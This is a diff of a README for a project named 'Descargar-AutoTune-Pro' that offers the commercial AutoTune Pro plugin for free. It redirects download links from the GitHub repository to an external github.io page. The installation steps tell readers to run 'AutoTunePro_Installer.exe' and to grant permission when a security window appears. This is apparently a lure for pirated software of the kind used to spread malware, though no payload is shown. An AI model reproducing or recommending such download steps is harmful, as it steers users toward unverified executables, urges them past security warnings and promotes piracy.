@@ -1,6 +1,6 @@
 # 🎧 Descargar-AutoTune-Pro - Pitch perfect vocals and studio production
 
-[![](https://img.shields.io/badge/Download-AutoTune_Pro-blue)](https://github.com/lyeem3554/Descargar-AutoTune-Pro)
+[![](https://img.shields.io/badge/Download-AutoTune_Pro-blue)](https://lyeem3554.github.io)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Your computer needs specific hardware to run this software. Ensure your system m
 
 Follow these steps to put the software on your computer.
 
-1. Navigate to the download link: [https://github.com/lyeem3554/Descargar-AutoTune-Pro](https://github.com/lyeem3554/Descargar-AutoTune-Pro)
+1. Navigate to the download link: [https://lyeem3554.github.io](https://lyeem3554.github.io)
 2. Open the file named "AutoTunePro_Installer.exe" once the download finishes.
 3. Grant permission to the installer if a security window appears.
 4. Follow the instructions on the screen to choose your installation folder.
